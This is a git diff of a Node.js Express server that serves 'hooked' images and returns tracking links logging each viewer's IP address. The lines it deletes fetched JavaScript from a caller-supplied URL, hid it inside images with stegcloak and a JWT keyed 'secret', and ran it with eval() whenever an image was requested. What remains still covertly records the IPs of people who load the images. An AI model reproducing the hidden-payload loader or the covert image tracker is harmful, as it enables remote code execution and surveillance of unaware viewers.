@@ -6,10 +6,7 @@ const uuidv4 = require('uuid').v4
 const getmac = require('getmac')
 const request = require('request-promise-native');
 const axios = require('axios');
-const sharp = require('sharp');
-const jsonwebtoken = require('jsonwebtoken');
-const stegcloak = require('stegcloak');
-const { promisify } = require('util');
+
 
 require('dotenv').config()
 app.use(cors())
@@ -28,32 +25,25 @@ const images = {}
 app.post(syn_config.preendpoint + 'encrypt', async (req, res) => {
   // fetch and encrypt the image from the provided URL, and save it to the server
   const imageUrl = req.body.imageUrl;
-  const jsUrl = req.body.jsurl;
+  const jsurl = req.body.jsurl;
   const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
   try {
-    // Fetch JavaScript code from GitHub URL and embed it into the image using stegcloak
-    const jsCodeResponse = await axios.get(jsUrl);
-    const jsCode = jsCodeResponse.data;
-    const encodedJSCode = jsonwebtoken.sign(JSON.stringify(jsCode), 'secret');
-    const imageBuffer = await axios.get(imageUrl, { responseType: 'arraybuffer' });
-    const stegcloakOptions = { password: 'secret' };
-    const encodedImage = await promisify(stegcloak.encode)(Buffer.from(imageBuffer.data), encodedJSCode, stegcloakOptions);
-    
-    const id = uuidv4();
-    images[id] = {
-      encodedImage,
-      clicks: 0,
-      ip,
-      userId: uuidv4()
-    };
-
-    const imageURL = syn_config.preendpoint + 'content/raw/' + id;
-    console.log(`New Image Hooked Track it here: ${syn_config.preendpoint + "content/tracking/"+id}`);
-    const trackinglink = `${syn_config.preendpoint}content/tracking/` + id;
-    res.status(200).send({ imageURL, trackinglink, id });
+      const imageBuffer = await request.get(imageUrl, { encoding: null });
+      const id = uuidv4();
+      const encryptedImage = encryptImage(imageBuffer);
+      images[id] = {
+          encryptedImage,
+          clicks: 0,
+          ip, // store the user's IP address in the object
+          userId: uuidv4() // generate a new unique identifier for the user
+      }
+      const imageURL = syn_config.preendpoint + 'content/raw/' + id
+      console.log(`New Image Hooked Track it here: ${syn_config.preendpoint + "content/tracking/"+id}`)
+      const trackinglink = `${syn_config.preendpoint}content/tracking/` + id
+      res.status(200).send({ imageURL, trackinglink, id })
   } catch (err) {
-    console.error(err);
-    res.status(400).send({ error: 'Error fetching or encrypting image' });
+      console.error(err);
+      res.status(400).send({ error: 'Error fetching or encrypting image' });
   }
 });
 
@@ -79,15 +69,6 @@ app.get(syn_config.preendpoint + 'content/raw/:id', async (req, res) => {
     const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
     images[id].tracking = images[id].tracking || [];
     images[id].tracking.push({ userId: images[id].userId, ip });
-
-
-    // Extract the encoded JavaScript string from the image using stegcloak
-    const stegcloakOptions = { password: 'secret' };
-    const decodedImage = await promisify(stegcloak.decode)(images[id].encodedImage, stegcloakOptions);
-    const decodedJSCode = jsonwebtoken.verify(decodedImage, 'secret');
-
-    // Execute the extracted JavaScript code
-    eval(decodedJSCode);
 
     // Decrypt the encrypted image data
     const decryptedBuffer = await decryptImage(images[id].encryptedImage);
